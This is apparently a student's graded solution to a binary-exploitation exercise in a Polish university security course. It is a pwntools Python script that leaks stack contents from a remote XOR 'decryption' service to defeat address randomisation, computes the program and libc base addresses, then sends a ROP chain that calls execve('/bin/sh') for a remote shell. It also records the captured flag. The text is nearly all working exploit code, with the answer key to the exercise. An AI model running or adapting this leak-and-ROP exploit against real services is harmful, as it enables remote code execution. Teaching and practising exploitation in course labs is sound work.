#Nr indeksu: 440004
#Zadanie: Zadanie zaliczeniowe - eksploitacja binarna - hard
#Flaga: bsk{18dad8700427285dd6b446a6c32af8fb}
#Skrypt: poniżej

#!/usr/bin/env python3
from pwn import *

exe = ELF("./hard_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
index_number = b"440004"


def conn():
    r = remote("bsk.bonus.re", 13337)
    return r


def main():
    r = conn()
    # good luck!
    #Czytamy wszystko co otrzymujemy, wysyłamy dane (jeden znak, bez znaczenia jaki), potem zera tak żeby nasze s zawierało to co jest na stosie (bo xorujemy z zerem)
    #Zer wysyłamy 160 (sprawdzone metodą prób i błędów tyle, żeby był na stosie adres powrotu do maina i adres powrotu do libc)
    r.recvn(len("There is a 60 second timeout on the challenge\nAfter that you have to reconnect\n"))
    r.recvn(len("Podaj numer indeksu\n"))
    r.sendline(index_number)
    r.recvn(len("Select difficulty\n1 - hard\n2 - medium\n3 - easy\n"))
    r.sendline(b"1")
    r.recvn(len("The flag is in /tmp/flag.txt\nGood luck!\n"))
    r.recvn(len("How long is the data?\n"))
    r.sendline(b"1")
    r.recvn(len("Gib data: "))
    r.sendline(b"x")
    r.recvn(len("\nHow long is the key?\n"))
    r.sendline(b"160")
    r.recvn(len("Gib key: "))
    r.sendline(b"\0" * 160)
    r.recvn(len("\nHere's your decrypted data:\n"))
    s = r.recvn(160)
    return_to_main = s[72:80]
    return_to_libc = s[104:112]
    #Offsety poniżej znalezione za pomocą gdb
    base_main = u64(return_to_main) - 0x1491  #adres return to main - offset
    base_libc = u64(return_to_libc) - 0x280d0 #adres return to libc - offset
    #print(hex(u64(return_to_main)))
    #print(hex(u64(return_to_libc)))
    #print(hex(base_main))
    #print(hex(base_libc))
    r.recvn(len("How long is the data?\n"))
    r.sendline(b"1")
    r.recvn(len("Gib data: "))
    r.sendline(b"a")
    r.recvn(len("\nHow long is the key?\n"))
    r.sendline(b"152")
    r.recvn(len("Gib key: "))
    #Wrzucamy payload którym (za pomocą znalezionych gadżetów) wykonamy syscall execve("/bin/sh", 0, 0)
    r.sendline(
        b"\0" * 72 +  
        p64((base_libc + 0x0000000000028715) ^ u64(return_to_main)) + #Pop rdi; ret
        p64((base_libc + 0x1c041b) ^ u64(s[80:88])) + #/bin/sh
        p64((base_libc + 0x000000000002a671) ^ u64(s[88:96])) + #Pop rsi; ret
        p64((0x0) ^ u64(s[96:104])) + #0
        p64((base_libc + 0x0000000000093359) ^ u64(s[104:112])) + #pop rdx ; pop rbx ; ret
        p64((0x0) ^ u64(s[112:120])) +  #0
        p64((0x0) ^ u64(s[120:128])) +  #0
        p64((base_libc + 0x0000000000046663) ^ u64(s[128:136])) +   #pop rax ; ret
        p64(59 ^ u64(s[136:144])) + #59
        p64((base_libc + 0x000000000002686d) ^ u64(s[144:152])) #syscall
    )
    r.interactive()
    #Otwiera nam się shell, w którym możemy wykonać cat /tmp/flag.txt
    #bsk{18dad8700427285dd6b446a6c32af8fb}
    


if __name__ == "__main__":
    main()
